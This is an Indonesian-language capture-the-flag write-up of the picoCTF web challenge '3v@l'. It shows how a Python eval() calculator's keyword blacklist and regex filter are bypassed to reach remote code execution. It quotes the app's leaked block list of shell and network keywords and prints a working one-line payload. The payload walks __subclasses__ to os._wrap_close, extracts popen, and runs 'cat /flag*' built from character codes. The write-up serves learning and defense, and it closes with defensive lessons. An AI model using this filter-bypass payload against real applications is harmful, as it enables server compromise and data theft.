# 3v@l

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Aplikasi "Bank-Loan Calculator" menerima formula dari pengguna lalu mengeksekusinya
dengan `eval()` Python dan menampilkan hasilnya. Tersedia filter blacklist keyword dan
regex yang harus dilewati untuk mendapatkan RCE dan membaca file flag.

## Informasi Awal

Instance dapat diakses melalui:

```text
http://shape-facility.picoctf.net:55798/
```

Halaman utama menampilkan form "Enter the formula" yang disubmit ke `/execute`.
Komentar TODO di source HTML halaman utama membocorkan mekanisme filter yang direncanakan:

```html
<!--
    TODO
    ------------
    Secure python_flask eval execution by
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\/]|\.'
-->
```

## Tools

- curl (pengujian payload berulang)
- Python lokal (memvalidasi payload terhadap blacklist & regex sebelum dikirim)
- Browser

## Analisis

### Konfirmasi eval injection

Input `1+1` mengembalikan `Result: 2` — `eval()` hidup dan hasilnya dirender ke halaman,
jadi semua output payload akan terlihat langsung.

### Pemetaan filter

Pengujian satu per satu menghasilkan peta:

| Uji | Hasil | Kesimpulan |
| --- | --- | --- |
| `1+1` | `2` | eval jalan, output tampil |
| `().__class__` | `<class 'tuple'>` | dunder & atribut lolos |
| payload mengandung substring `ls` | `Error: Detected forbidden keyword 'ls'` | blacklist adalah substring match |

Blacklist: `os, eval, exec, bind, connect, python, socket, ls, cat, shell`.
Regex memblokir `0x...`, `\u....`, `%xx`, `.ext`, `\`, `/`, `..`.

Catatan penting: blokirnya substring-match, bukan parsing — `"glob"+"als"` pun tertangkap
karena huruf `l` dan `s` berurutan di teks input.

### Rencana bypass

1. Jangan pernah menulis kata terlarang di input — susun saat runtime dengan
   `"".join([...potongan...])` atau `chr(kode_angka)`.
2. Jangkau modul `os` tanpa menulis "os": lewat `os._wrap_close`, kelas yang bisa dicari
   di daftar semua kelas yang sudah dimuat:
   `().__class__.__base__.__subclasses__()`.
3. Dari kelas itu: `__init__.__globals__` memberikan dict globals modul, berisi `popen`.
4. Perintah shell disusun dari kode karakter: `cat /flag*` =
   `[99,97,116,32,47,102,108,97,103,42]`.

## Langkah Penyelesaian

### 1. Menemukan pintu masuk

```python
().__class__.__base__.__subclasses__()
```

Output berisi 503 kelas; `os._wrap_close` ada di indeks 132, `subprocess.Popen` di 355.
Supaya tidak bergantung pada indeks (berubah antar restart), dicari lewat nama:

```python
[x for x in ().__class__.__base__.__subclasses__() if "wrap" in x.__name__]
```

Hasil: `[<class 'wrapper_descriptor'>, ..., <class 'os._wrap_close'>, ...]`.

### 2. Menyusun payload final

Perlu perhatian ekstra: string `"globals"` dan `"__builtins__"` sendiri mengandung atau
berdekatan dengan potongan kata terlarang, sehingga dipecah jadi potongan kecil.
Validasi dilakukan dulu secara lokal: tidak ada keyword terlarang sebagai substring,
tidak ada pola regex yang tertangkap.

Payload final (satu baris):

```python
[g["popen"]("".join(chr(i) for i in [99,97,116,32,47,102,108,97,103,42])).read() for g in [getattr(getattr(x,"__init__"),"".join(["__","gl","ob","a","l","s__"])) for x in ().__class__.__base__.__subclasses__() if "wrap_clo" in x.__name__]]
```

Dibaca bertingkat:

1. Daftar semua kelas yang dimuat, saring yang namanya mengandung `wrap_clo`
   (yakni `os._wrap_close`; ditulis terpotong agar substring `os` tidak pernah muncul).
2. `getattr(x,"__init__")` lalu `"".join(["__","gl","ob","a","l","s__"])` → `__globals__`
   (dipecah agar tidak membentuk substring terlarang di teks input).
3. Dari dict globals, ambil `popen` dan jalankan perintah yang disusun dari kode karakter:
   `chr(99)chr(97)chr(116)...` = `cat /flag*` (42 = `*`, wildcard nama file flag).
4. `.read()` membaca output dan hasilnya dirender ke halaman.

Output yang ditampilkan aplikasi:

```text
Result: ['picoCTF{D0nt_Use_Unsecure_f@nctionsf847a9bc}']
```

## Flag

```text
picoCTF{D0nt_Use_Unsecure_f@nctionsf847a9bc}
```

## Pembelajaran

- `eval()` pada input pengguna adalah RCE; daftar nama challenge-nya saja sudah
  memperingatkan: "Don't Use Unsecure Functions".
- Blacklist substring bisa dilewati dengan menyusun string saat runtime
  (`join`, `chr`), sehingga teks input tidak pernah mengandung kata terlarang.
- `().__class__.__base__.__subclasses__()` adalah jalur generik menjangkau modul
  berbahaya tanpa `import` — cukup cari kelas yang globals-nya memuat modul target.
- Filter regex atas karakter (`\`, `/`, `..`, `0x`) memaksa encoding tambahan
  (kode karakter `chr`), tapi tidak menghentikan eksploitasi.
- Pesan error yang eksplisit (`Detected forbidden keyword 'ls'`) mempercepat pemetaan
  filter — pelajaran defensif: jangan bocorkan alasan blok ke pengguna.
- Catatan proses: `invalid syntax (, line 1)` saat re-run di browser hampir selalu
  berarti payload rusak saat disalin (kutip melengkung / line-break), bukan filter.

## Referensi

- Payload obfuscation Python eval blacklist bypass (teknik `__subclasses__` walk)
- Writeup SSTI2 di repo yang sama (pola penyusunan string terpotong serupa)
